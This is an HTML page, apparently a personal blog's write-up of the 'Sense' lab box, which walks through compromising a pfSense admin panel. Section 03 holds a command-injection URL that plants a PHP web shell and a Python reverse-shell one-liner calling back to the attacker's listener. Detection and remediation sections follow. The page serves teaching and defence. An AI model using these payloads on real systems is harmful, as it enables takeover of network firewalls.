@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sense — Writeup — Khalil Gueye</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg: #FFFFFF;
+    --bg-raise: #F4F6F9;
+    --panel: #FFFFFF;
+    --panel-border: #D5DCE5;
+    --text: #0B1F3A;
+    --text-dim: #4A5A70;
+    --text-faint: #8A97A8;
+    --accent: #1F4E79;
+    --accent-dim: #5A7CA0;
+    --green: #2E7D57;
+    --mono: 'IBM Plex Mono', ui-monospace, 'SF Mono', Consolas, monospace;
+    --sans: 'IBM Plex Sans', -apple-system, sans-serif;
+    --serif: 'IBM Plex Serif', Georgia, serif;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body{
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.65;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  a { color: inherit; text-decoration: none; }
+  ::selection { background: var(--accent); color: #fff; }
+  :focus-visible{ outline: 2px solid var(--accent); outline-offset: 3px; }
+
+  .wrap{ max-width: 820px; margin: 0 auto; padding: 0 32px; }
+
+  /* ---------- HEADER ---------- */
+  .site-head{
+    border-bottom: 1px solid var(--panel-border);
+    position: sticky; top: 0;
+    background: rgba(255,255,255,0.9);
+    backdrop-filter: blur(8px);
+    z-index: 50;
+  }
+  .site-head .inner{
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 20px 32px; max-width: 1020px; margin: 0 auto;
+  }
+  .brand{ display: flex; align-items: center; gap: 11px; font-weight: 600; font-size: 15px; letter-spacing: 0.01em; color: var(--text); }
+  .brand .mark{ width: 12px; height: 12px; background: var(--accent); flex-shrink: 0; border-radius: 1px; }
+  .site-nav{ display: flex; gap: 30px; }
+  .site-nav a{ font-size: 14.5px; color: var(--text-dim); font-weight: 500; transition: color 0.15s ease; }
+  .site-nav a:hover{ color: var(--accent); }
+  .site-nav a.current{ color: var(--text); }
+
+  /* ---------- HERO ---------- */
+  .case-hero{ padding: 56px 0 40px; }
+  .back{ font-family: var(--mono); font-size: 12.5px; color: var(--text-faint); display: inline-block; margin-bottom: 28px; transition: color 0.15s ease; }
+  .back:hover{ color: var(--accent); }
+  .case-hero h1{
+    font-family: var(--serif); font-weight: 600;
+    font-size: clamp(40px, 6.5vw, 62px); letter-spacing: -0.02em;
+    line-height: 1.02; color: var(--text);
+  }
+  .case-hero .subtitle{
+    margin-top: 18px; font-size: 17px; line-height: 1.7;
+    color: var(--text-dim); max-width: 60ch;
+  }
+
+  /* ---------- META STRIP ---------- */
+  .meta-strip{
+    display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px;
+    background: var(--panel-border); border: 1px solid var(--panel-border);
+    border-radius: 3px; overflow: hidden; margin-top: 32px;
+  }
+  .meta-cell{ background: var(--panel); padding: 14px 16px; }
+  .meta-cell .k{ font-family: var(--mono); font-size: 10px; letter-spacing: 0.06em; color: var(--text-faint); }
+  .meta-cell .v{ font-family: var(--mono); font-size: 13.5px; color: var(--text); margin-top: 5px; font-weight: 500; }
+  .meta-cell .v.easy{ color: var(--green); }
+  .meta-cell .v.medium{ color: var(--accent); }
+  .meta-cell .v.hard{ color: #B24A3E; }
+  .meta-cell .v.insane{ color: #6D4E9C; }
+  @media (max-width: 640px){ .meta-strip{ grid-template-columns: repeat(2, 1fr); } }
+
+  .attck-row{ margin-top: 16px; display: flex; flex-wrap: wrap; gap: 7px; align-items: center; }
+  .attck-row .lbl{ font-family: var(--mono); font-size: 10px; letter-spacing: 0.06em; color: var(--text-faint); margin-right: 4px; }
+  .chip{ font-family: var(--mono); font-size: 11px; padding: 3px 9px; border: 1px solid #BCD0E4; border-radius: 2px; color: var(--accent); background: #EEF3F9; }
+
+  /* ---------- ARTICLE ---------- */
+  .doc{ padding: 8px 0 24px; }
+  .doc section{ padding: 44px 0; border-top: 1px solid var(--panel-border); }
+
+  .sec-label{
+    font-family: var(--sans); font-weight: 600; font-size: 15px;
+    color: var(--text); margin-bottom: 20px;
+    display: flex; align-items: baseline; gap: 12px;
+  }
+  .sec-label .num{ font-family: var(--mono); font-size: 13px; color: var(--accent); font-weight: 600; }
+
+  .doc h2{ font-family: var(--serif); font-weight: 600; font-size: 24px; letter-spacing: -0.01em; margin-bottom: 16px; color: var(--text); }
+  .doc h3{ font-family: var(--sans); font-weight: 600; font-size: 16px; color: var(--text); margin: 26px 0 12px; }
+  .doc p{ margin: 0 0 16px; font-size: 16px; color: var(--text-dim); line-height: 1.72; }
+  .doc p strong{ color: var(--text); font-weight: 600; }
+  .doc ul{ margin: 0 0 16px 0; padding-left: 0; list-style: none; }
+  .doc ul li{ font-size: 15.5px; color: var(--text-dim); padding-left: 22px; position: relative; margin-bottom: 10px; line-height: 1.6; }
+  .doc ul li::before{ content: '—'; color: var(--accent-dim); position: absolute; left: 0; }
+  .doc ul li strong{ color: var(--text); }
+  .doc ol{ margin: 0 0 16px 0; padding-left: 22px; }
+  .doc ol li{ font-size: 15.5px; color: var(--text-dim); margin-bottom: 12px; line-height: 1.6; }
+  .doc ol li strong{ color: var(--text); }
+
+  code.inl{ font-family: var(--mono); font-size: 0.88em; background: var(--bg-raise); border: 1px solid var(--panel-border); border-radius: 3px; padding: 1px 5px; color: var(--accent); }
+
+  /* ---------- CODE / EVIDENCE BLOCKS ---------- */
+  .term{ background: var(--bg-raise); border: 1px solid var(--panel-border); border-radius: 5px; margin: 18px 0; overflow: hidden; }
+  .term-bar{ display: flex; align-items: center; gap: 8px; padding: 8px 14px; border-bottom: 1px solid var(--panel-border); font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.04em; color: var(--text-faint); }
+  .term-bar .d{ width: 8px; height: 8px; border-radius: 50%; background: #CBD4DF; }
+  .term-bar .d.a{ background: var(--accent-dim); }
+  .term pre{ margin: 0; padding: 14px 16px; overflow-x: auto; font-family: var(--mono); font-size: 13px; line-height: 1.55; color: var(--text); }
+  .term pre .p{ color: var(--accent); }
+  .term pre .c{ color: var(--text-faint); }
+
+  /* ---------- MECHANISM CALLOUT ---------- */
+  .mech{ border-left: 3px solid var(--accent); background: #EEF3F9; padding: 15px 18px; border-radius: 0 4px 4px 0; margin: 22px 0; }
+  .mech .lbl{ font-family: var(--mono); font-size: 11px; letter-spacing: 0.03em; color: var(--accent); font-weight: 600; display: block; margin-bottom: 6px; }
+  .mech p{ margin: 0; font-size: 15px; color: var(--text-dim); line-height: 1.65; }
+  .mech p strong{ color: var(--text); }
+
+  /* ---------- TABLES ---------- */
+  .tbl-scroll{ overflow-x: auto; margin: 20px 0; }
+  table{ width: 100%; border-collapse: collapse; font-size: 14px; min-width: 480px; }
+  th, td{ text-align: left; padding: 10px 14px; border: 1px solid var(--panel-border); vertical-align: top; }
+  th{ font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.04em; color: var(--text-dim); background: var(--bg-raise); font-weight: 600; }
+  td{ color: var(--text-dim); }
+  td .att{ font-family: var(--mono); font-size: 12px; color: var(--accent); }
+  td.num{ font-family: var(--mono); color: var(--text-faint); width: 34px; }
+
+  /* ---------- CLOSING ---------- */
+  .closing{ text-align: center; padding: 52px 0 !important; }
+  .closing .sig{ font-family: var(--mono); font-size: 13px; letter-spacing: 0.08em; color: var(--accent); margin-top: 22px; }
+
+  /* ---------- FOOTER ---------- */
+  .site-foot{ border-top: 1px solid var(--panel-border); padding: 28px 0 44px; }
+  .site-foot .inner{ display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px; font-size: 13.5px; color: var(--text-faint); max-width: 1020px; margin: 0 auto; padding: 0 32px; }
+  .site-foot a{ color: var(--text-dim); font-weight: 500; }
+  .site-foot a:hover{ color: var(--accent); }
+  .site-foot .links{ display: flex; gap: 22px; }
+</style>
+</head>
+<body>
+
+<header class="site-head">
+  <div class="inner">
+    <a href="../index.html" class="brand"><span class="mark"></span>Khalil Gueye</a>
+    <nav class="site-nav">
+      <a href="index.html" class="current">Writeups</a>
+      <a href="../portfolio/">Portfolio</a>
+      <a href="../videos/">Videos</a>
+    </nav>
+  </div>
+</header>
+
+<section class="case-hero wrap">
+  <a href="index.html" class="back">← Writeups</a>
+  <h1>Sense</h1>
+  <p class="subtitle">A pfSense firewall admin panel leaks its own credentials, then a stock RRD-graph endpoint hands over root-equivalent command execution.</p>
+
+  <div class="meta-strip">
+    <div class="meta-cell"><div class="k">Target</div><div class="v">10.10.10.60</div></div>
+    <div class="meta-cell"><div class="k">Platform</div><div class="v">FreeBSD</div></div>
+    <div class="meta-cell"><div class="k">Difficulty</div><div class="v easy">Easy</div></div>
+    <div class="meta-cell"><div class="k">Root cause</div><div class="v">Command Injection</div></div>
+  </div>
+  <div class="attck-row">
+    <span class="lbl">ATT&amp;CK</span>
+    <span class="chip">T1595.003</span>
+    <span class="chip">T1190</span>
+    <span class="chip">T1059.004</span>
+    <span class="chip">T1552.001</span>
+  </div>
+</section>
+
+<article class="doc wrap">
+<section>
+  <div class="sec-label"><span class="num">00</span> Why this box matters</div>
+  <h2>The firewall admin panel is the crown jewel — and the target</h2>
+  <p>This box hosts a pfSense instance: the web console that configures firewall rules, VPN tunnels, DHCP, and routing for an entire network. Compromising this single panel doesn't just get you a shell on one host — it gets you control of the network's perimeter defenses. That makes it a textbook example of why admin interfaces for security appliances need to be locked down harder than anything else on the network, not left exposed with default-adjacent credentials and unpatched known CVEs.</p>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">01</span> Recon — subdomains that leak secrets</div>
+  <h3>1.1 — Enumerating hidden paths</h3>
+  <p>The root site is the standard pfSense login page. Directory brute-forcing with Gobuster against the host turns up two files that were clearly left behind by an admin who assumed &quot;undocumented&quot; meant &quot;safe&quot;.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;gobuster</div>
+<pre><span class="p">$</span> gobuster dir -u http://10.10.10.60 -w /usr/share/wordlists/dirb/common.txt -x txt
+<span class="c"># notable hits</span>
+/system-users.txt   (Status: 200)
+/changelog.txt       (Status: 200)</pre>
+  </div>
+  <h3>1.2 — Reading the leaked files</h3>
+  <p><code class="inl">system-users.txt</code> drops a clue pointing at a specific username and a weak/guessable password scheme for the pfSense login. <code class="inl">changelog.txt</code> states that two of three known vulnerabilities have been patched — which is effectively a confession that a third, unpatched vulnerability is still live on this install.</p>
+  <div class="mech">
+    <span class="lbl">Mechanism first</span>
+    <p>This isn't a technical bug — it's an <strong>information disclosure</strong> failure. Static files under the webroot with no auth requirement leaked both a credential hint and a roadmap of what's still exploitable. Attackers don't need to guess blind when the target tells them what's broken.</p>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">02</span> Authenticating to the dashboard</div>
+  <p>Using the username hinted at in <code class="inl">system-users.txt</code> paired with the associated password, we authenticate to the pfSense web UI and land on the standard dashboard.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;login</div>
+<pre><span class="p">$</span> curl -c cookies.txt -d "usernamefld=&lt;user&gt;&amp;passwordfld=&lt;pass&gt;" http://10.10.10.60/index.php
+<span class="c"># [REDACTED — grab your own] — creds sourced from system-users.txt</span></pre>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">03</span> RRD graph command injection</div>
+  <h3>3.1 — Finding the sink</h3>
+  <p>Inside the dashboard, <strong>Status → RRD Graphs</strong> renders performance graphs by requesting a backend endpoint and passing the graph's name as a URL parameter. That parameter is concatenated directly into a shell command on the backend rather than being sanitized or passed as a safe argument.</p>
+  <div class="mech">
+    <span class="lbl">Mechanism first</span>
+    <p>This is <strong>OS command injection</strong> (matches the third, unpatched CVE hinted at in <code class="inl">changelog.txt</code>). The graph-name parameter is trusted as data but executed as code. Anything we control in that parameter runs verbatim on the underlying FreeBSD shell with the privileges of the web service.</p>
+  </div>
+  <h3>3.2 — Dropping a web shell</h3>
+  <p>We abuse the injection point once to write a second, attacker-controlled page to the webroot — a minimal web shell that accepts a command via a URL parameter and executes it on the box.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;webshell</div>
+<pre><span class="p">$</span> curl "http://10.10.10.60/status_rrd_graph_img.php?database=queues;printf%20'&lt;?php system(\$_GET[cmd]); ?&gt;'%20&gt;%20/usr/local/www/shell.php;"
+<span class="c"># subsequent commands: /shell.php?cmd=id</span></pre>
+  </div>
+  <h3>3.3 — Upgrading to an interactive shell</h3>
+  <p>With arbitrary command execution confirmed through the planted shell, we pull a Python reverse shell one-liner through it to get an interactive session back on our listener.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;reverse shell</div>
+<pre><span class="p">$</span> nc -lvnp 4444
+<span class="p">$</span> curl "http://10.10.10.60/shell.php?cmd=python%20-c%20'import%20socket,os,pty;s=socket.socket();s.connect((\"10.10.14.5\",4444));[os.dup2(s.fileno(),f)for%20f%20in(0,1,2)];pty.spawn(\"/bin/sh\")'"
+<span class="c"># shell caught on listener</span></pre>
+  </div>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">04</span> Post-exploitation</div>
+  <p>From the reverse shell we have command execution as the web-service user on the pfSense box. From here it's a straightforward matter of reading the flag files from the filesystem to close out the box.</p>
+  <div class="term">
+    <div class="term-bar"><span class="d a"></span><span class="d"></span><span class="d"></span>&nbsp;flags</div>
+<pre><span class="p">$</span> cat /root/root.txt
+[REDACTED — grab your own]
+<span class="p">$</span> cat /home/*/user.txt
+[REDACTED — grab your own]</pre>
+  </div>
+</section>
+
+<div class="tbl-scroll">
+  <table>
+    <thead><tr><th>#</th><th>Action</th><th>ATT&amp;CK</th></tr></thead>
+    <tbody>
+      <tr><td class="num">1</td><td>Subdomain/path enumeration with Gobuster</td><td><span class="att">T1595.003</span></td></tr>
+      <tr><td class="num">2</td><td>Credential and vuln-status disclosure via unauthenticated txt files</td><td><span class="att">T1552.001</span></td></tr>
+      <tr><td class="num">3</td><td>Authenticated to pfSense dashboard</td><td><span class="att">T1078</span></td></tr>
+      <tr><td class="num">4</td><td>Exploited RRD graph command injection (public-facing app)</td><td><span class="att">T1190</span></td></tr>
+      <tr><td class="num">5</td><td>Executed shell commands / web shell / reverse shell</td><td><span class="att">T1059.004</span></td></tr>
+    </tbody>
+  </table>
+</div>
+
+<section>
+  <div class="sec-label"><span class="num">05</span> Detection</div>
+  <ul>
+    <li>Alert on requests to <code class="inl">status_rrd_graph_img.php</code> (or similar diagnostic endpoints) containing shell metacharacters (<code class="inl">;</code>, <code class="inl">|</code>, <code class="inl">&amp;&amp;</code>, backticks) in query parameters.</li>
+    <li>Monitor the pfSense webroot for newly created <code class="inl">.php</code> files outside of update/install windows — a classic web-shell-drop indicator.</li>
+    <li>Flag outbound connections from the firewall appliance itself to unfamiliar external IPs on non-standard ports (reverse shell callbacks).</li>
+    <li>Log and alert on access to any unauthenticated <code class="inl">.txt</code>/changelog/status files under the webroot — these should never be reachable pre-auth.</li>
+  </ul>
+</section>
+
+<section>
+  <div class="sec-label"><span class="num">06</span> Remediation</div>
+  <ol>
+    <li><strong>Patch immediately.</strong> Keep pfSense (and every network appliance) on a current, patched release — the changelog itself told us a fix existed for two of three flaws; the third should never have shipped unpatched in a lab.</li>
+    <li><strong>Remove or protect diagnostic/leftover files.</strong> <code class="inl">system-users.txt</code> and <code class="inl">changelog.txt</code> should never be served from a production webroot without authentication.</li>
+    <li><strong>Sanitize all input reaching a shell.</strong> Graph names, filenames, and any other parameter that ends up in an OS command must be validated against a strict allow-list, never concatenated into a shell string.</li>
+    <li><strong>Restrict management-plane exposure.</strong> Admin panels for firewalls/VPN appliances belong on an out-of-band management network or behind VPN — not reachable from the same segment as general traffic.</li>
+  </ol>
+</section>
+
+<section class="closing">
+  <p>Sense is a clean demonstration of a chained low-effort attack: leaked credentials plus an unpatched, publicly known command injection in a security appliance's own admin console. The irony is hard to miss — the device meant to enforce the network's security policy became the softest target on it. Patch cadence and input sanitization aren't optional on anything sitting at the network edge.</p>
+  <div class="sig">build it · break it · catch it</div>
+</section>
+</article>
+
+<footer class="site-foot">
+  <div class="inner">
+    <span>© 2026 Khalil Gueye — Raleigh, NC</span>
+    <span class="links">
+      <a href="https://github.com/khalilsgueye" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://youtube.com/@khalilgueye10" target="_blank" rel="noopener">YouTube</a>
+      <a href="https://twitter.com/khalilgueye10" target="_blank" rel="noopener">X</a>
+    </span>
+  </div>
+</footer>
+
+</body>
+</html>
